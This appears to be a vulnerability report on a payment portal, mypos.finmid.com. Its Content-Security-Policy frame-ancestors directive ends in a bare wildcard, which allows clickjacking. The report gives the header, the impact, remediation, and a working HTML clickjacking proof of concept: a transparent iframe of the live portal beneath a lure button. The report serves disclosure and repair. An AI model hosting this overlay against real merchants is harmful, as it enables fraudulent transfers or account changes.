# F003 mypos.finmid.com CSP frame-ancestors wildcard enables clickjacking

Status: confirmed
Severity: P2 / Medium (potentially P2 High depending on which in-session actions a framed merchant can be tricked into)
CVSS 3.1: 5.4 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)
OWASP: A05:2021 Security Misconfiguration (CWE-1021 Improper Restriction of Rendered UI Layers)

## Affected endpoint

GET https://mypos.finmid.com/ (merchant portal entry; applies to the whole SPA because the header is set at the host level)

## Observed header

```
content-security-policy: default-src 'self'; script-src 'self' 'unsafe-eval' https://*.posthog.com/ https://*.finapi.io/ https://pay.gocardless.com; img-src 'self' data: https://webapp-resources.finmid.com/ https://ssl.gstatic.com https://www.gstatic.com https://www.gravatar.com/ https://onboarding-resources.finmid.com/ https://cdnjs.cloudflare.com/ https://*.finapi.io/; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://*.posthog.com/ https://*.finapi.io/; font-src 'self' data: https://fonts.googleapis.com https://fonts.gstatic.com; connect-src 'self' https://gateway.finmid.com/ https://o1053131.ingest.sentry.io/ https://*.posthog.com/ https://*.finapi.io/ https://*.s3.eu-central-1.amazonaws.com/ https://api.gocardless.com; frame-ancestors https://merchant.wolt.com/ https://business.vivid.money/ vivid://* *; frame-src https://pay.gocardless.com
x-frame-options: DENY
```

The `frame-ancestors` directive ends with a bare `*` after the three legitimate embedding contexts (Wolt merchant portal, Vivid business portal, Vivid iOS deep link). Per CSP 3 semantics the `*` keyword matches any origin, so the entire source list collapses to allow framing from anywhere.

`x-frame-options: DENY` is present but is explicitly superseded by `frame-ancestors` in every modern browser (Chrome, Firefox, Safari, Edge), so it provides no residual protection.

## Impact

Any attacker-controlled page can embed https://mypos.finmid.com/ in an iframe. If a MyPOS merchant visits the attacker page while logged in to mypos.finmid.com, the attacker can:

- Overlay transparent click-targets on top of the framed portal (UI redress / clickjacking) and trick the merchant into clicking in-session actions.
- Use drag-and-drop or paste tricks to exfiltrate data visible inside the frame.
- Chain with other CSRF-weak endpoints in the merchant SPA to perform state changes.

Because mypos is a payment and financing portal, likely in-session actions include: initiating transfers, changing payout bank details, generating API keys, inviting new users, or approving financing offers. Each of these raises the finding toward P1 Critical. Without an authenticated session to enumerate the exact action surface, this report lands at P2 Medium with the explicit note that it is an underestimate pending account-level verification.

## Proof of concept

Reproduce the header:

```bash
curl -sI https://mypos.finmid.com/ | grep -i content-security-policy
```

Minimal clickjacking proof-of-concept (host anywhere, open in a browser that has an active mypos session):

```html
<!doctype html>
<html>
  <body>
    <h1 style="position:absolute;z-index:2;color:white;background:red">
      Click here to claim your prize
    </h1>
    <iframe
      src="https://mypos.finmid.com/"
      style="position:absolute;z-index:1;opacity:0.0001;width:100vw;height:100vh;border:0"
    ></iframe>
  </body>
</html>
```

If the header included a correct `frame-ancestors` the browser would refuse to render the iframe; with the current header it renders normally.

## Remediation

Remove the trailing `*` from the `frame-ancestors` directive, leaving only the three intended embedders:

```
frame-ancestors https://merchant.wolt.com/ https://business.vivid.money/ vivid://*;
```

Optionally also tighten the three origins to no-trailing-slash form and remove the custom scheme if iOS integration no longer needs it.

Secondary recommendation: once CSP is fixed, drop the redundant `x-frame-options: DENY` to avoid signalling two conflicting intents.

## References

- CSP Level 3, Section 7.6 (frame-ancestors directive)
- https://www.w3.org/TR/CSP3/#directive-frame-ancestors
- MDN clickjacking defence note that CSP overrides XFO when both are present
